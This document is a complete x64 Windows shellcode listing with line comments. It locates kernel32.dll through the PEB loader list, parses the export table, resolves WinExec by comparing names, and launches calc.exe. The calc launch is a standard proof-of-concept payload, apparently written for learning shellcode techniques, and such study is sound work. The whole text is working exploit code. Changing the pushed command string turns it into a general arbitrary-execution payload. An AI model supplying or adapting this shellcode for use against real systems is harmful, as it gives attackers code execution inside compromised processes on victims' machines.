xor rax, rax
xor rcx, rcx
mov rcx, gs:[rax + 0x60]      ; Address of PEB is loaded
mov rcx, [rcx+0x18]           ; Address of PEB_LDR_Module is loaded
mov rcx, [rcx+0x20]           ; Address of InMemoryOrderModuleList is loaded this is pointing to kernelbase.dll
mov rcx, [rcx+ 0x00]          ; Pointing to ntdll's ldr_data_table_entry
mov rcx, [rcx + 0x00]         ; kernel32.dll's ldr_data_table_entry is now referenced
mov rcx, [rcx+0x20] 	      ; base Address of kernel32.dll is now loaded
mov r10, rcx                  ; r10 and rcx have kernel32 base


mov ecx, [rcx + 0x3c]         ; Find RVA to PE header
add rcx, r10                  ; Points to the PE header
;mov rcx, [rcx + 0x78]        ; RVA of Export table directory
mov ecx, [rcx + 0x88]         ; RVA of Export table directory
add rcx, r10                  ; Export table directory address loaded
xor r9, r9
mov r9d, [rcx + 0x1c]         ; RVA Export Address Table
add r9, r10                   ; Address to export Address Table
xor r11, r11
mov r11d, [rcx + 0x20]        ; RVA Export Name pointer table address 
add r11, r10                  ; Adrdess of Export Name pointer table 
xor r12, r12              
mov r12d, [rcx + 0x24]        ; RVA of Ordinal Table
add r12, r10                  ; Address of Ordinal Table

xor rcx, rcx                  ; rcx is cleared
mov rcx, 0x7                  ; Length of WinExec is loaded into rcx
mov rax, 0x00636578456e6957   ; "\00cexEniW" is loaded into rax
push rax                      ; The string name is pushed onto the stack
push rcx                      ; Length is pushed onto the stack
call dynamic_api_resolve      ; dynamic_api_resolve label is called
mov r14, rax                  ; return address of the WinExec is put into r14
jmp next                      ; we jump to the next label

dynamic_api_resolve:
pop rbx                       ; return address is stored in rbx
pop rcx                       ; Length of the api is stored into rcx
xor rax, rax                  ; rax is cleared
mov rdx, rsp                  ; Move the address of name of the api into rdx
push rcx                      ; Length of the api is pushed onto the stack

loop:

mov rcx, [rsp]                ; The counter is being refreshed each time
xor rdi, rdi                  ; clear rdi for getting the name
mov edi, [r11 + rax * 4]      ; RVA of function name symbol  = Address of Name Pointer Table + counter * 4
add rdi, r10                  ; Address of  Function name symbol = RVA of function name symbol + base address 
mov rsi, rdx                  ; moving string to be compared into rsi

repe cmpsb                    ; comparing strings in rdi and rsi
je get_addr                   ; If equal we jump to get the address
inc rax                       ; Else increment counter
jmp loop                      ; jump back into loop


get_addr:
pop rcx                       ; Remove string length from top of stack
mov ax, [r12 + rax * 2]       ; Ordinal number of kernel 32 API (WinExec) = Adress of ordinal table + Counter * 2

mov eax, [r9 + rax * 4]       ; RVA of API = Address of Export Address Table + Ordinal number of WinExec * 4
add rax, r10                  ; Address of the API = RVA of API + base address
push rbx                      ; Pushing the Return Address back onto the stack
ret

;------------------------now r14 has our API --------------------------------------- 

next:
xor rcx, rcx                  ; clears out rcx   
mul rcx                       ; rax, rdx and rcx are 0

push rax                      ; Null Terminate string on stack
mov rax, 0x6578652e636c6163   ; Moving "exe.clac" into rax
push rax

mov rcx, rsp                  ; into first argument
inc rdx                       ; Argument to winEXe show_Normal

sub rsp, 0x20                 
call r14